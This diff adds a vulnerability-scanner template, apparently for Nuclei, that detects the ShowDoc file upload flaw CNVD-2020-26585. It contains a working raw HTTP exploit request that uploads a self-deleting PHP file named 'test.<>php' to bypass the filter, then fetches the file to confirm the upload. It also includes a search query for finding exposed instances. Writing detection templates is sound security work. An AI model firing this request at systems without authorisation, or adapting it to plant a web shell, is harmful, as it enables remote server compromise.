@@ -1,0 +1,69 @@
+id: CNVD-2020-26585
+
+info:
+  name: Showdoc File Uploads
+  author: Co5mos
+  severity: critical
+  description: ShowDoc is an online API and technical documentation tool that is very suitable for IT teams. Showdoc has a file upload vulnerability, which attackers can exploit to gain server permissions.
+  reference:
+    - https://vul.wangan.com/a/CNVD-2020-26585
+    - https://blog.csdn.net/qq_48985780/article/details/122211136
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
+    cvss-score: 9.9
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    fofa-query: app="ShowDoc"
+  tags: showdoc,cnvd,cnvd2020,fileupload
+
+requests:
+  - raw:
+      - |
+        POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
+        Content-Length: 264
+        
+        ----------------------------921378126371623762173617
+        Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+        Content-Type: text/plain
+
+        <?php echo md5('CNVD-2020-26585'); unlink(__FILE__); ?>
+        ----------------------------921378126371623762173617--
+
+      - |
+        GET /Public//Uploads//{{date}}//{{file}} HTTP/1.1
+        Host: {{Hostname}}
+  
+    extractors:
+      - type: regex
+        name: date
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.php)'
+
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        group: 2
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.php)'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "8e20346f3b8304b53f3b120c2b857742"
+
+      - type: status
+        status:
+          - 200
